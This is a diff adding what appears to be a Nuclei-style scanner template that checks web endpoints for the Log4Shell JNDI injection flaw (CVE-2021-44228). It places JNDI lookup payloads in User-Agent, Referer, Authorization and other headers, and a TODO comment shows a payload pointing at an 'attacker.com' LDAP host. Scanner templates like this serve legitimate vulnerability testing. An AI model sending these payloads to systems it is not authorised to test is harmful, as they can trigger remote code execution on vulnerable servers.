@@ -1,0 +1,52 @@
+id: xpl-rce-log4shell
+info:
+  name: "Log4Shell JNDI Injection (CVE-2021-44228)"
+  author: imtaqin
+  severity: critical
+  description: |
+    Checks common endpoints for reflection of JNDI lookup payloads.
+    NOTE: true blind RCE detection requires an OOB server —
+    the cloud subscription provides interact.sh-lite for reliable
+    callback validation.
+  tags:
+    - cve
+    - rce
+    - log4j
+    - jndi
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-score: 10.0
+    cve-id: CVE-2021-44228
+
+# TODO(backend): when OOB is enabled, swap `${jndi:ldap://attacker.com}`
+# for `${jndi:ldap://{{interactsh-url}}/{{randstr}}}` and correlate callbacks.
+
+variables:
+  canary: "xpl_log4j_{{randstr}}"
+  jndi: "${jndi:ldap://xpl.invalid/{{canary}}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      User-Agent: "{{jndi}}"
+      X-Api-Version: "{{jndi}}"
+      Referer: "{{jndi}}"
+      X-Forwarded-For: "{{jndi}}"
+      Authorization: "Bearer {{jndi}}"
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: all
+        words:
+          - "{{canary}}"
+        name: canary-echo
+      - type: word
+        part: body
+        words:
+          - "java.net.UnknownHostException: xpl.invalid"
+          - "JndiLookup"
+        condition: or
+        name: jndi-error
